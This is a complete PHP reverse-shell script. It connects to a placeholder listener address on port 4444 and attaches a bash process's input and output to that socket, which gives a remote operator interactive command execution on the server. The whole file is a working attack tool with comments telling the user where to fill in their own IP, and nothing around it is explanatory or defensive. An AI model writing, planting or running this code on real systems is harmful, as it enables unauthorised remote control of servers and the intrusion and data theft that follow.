<?php
$ip = 'YOUR_IP';  // Change this to your listener's IP
$port = 4444;     // Change this to your listening port

$sock = fsockopen($ip, $port);
$proc = proc_open('bash', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);

while (proc_get_status($proc)['running']) {
    sleep(1);
}
proc_close($proc);
?>
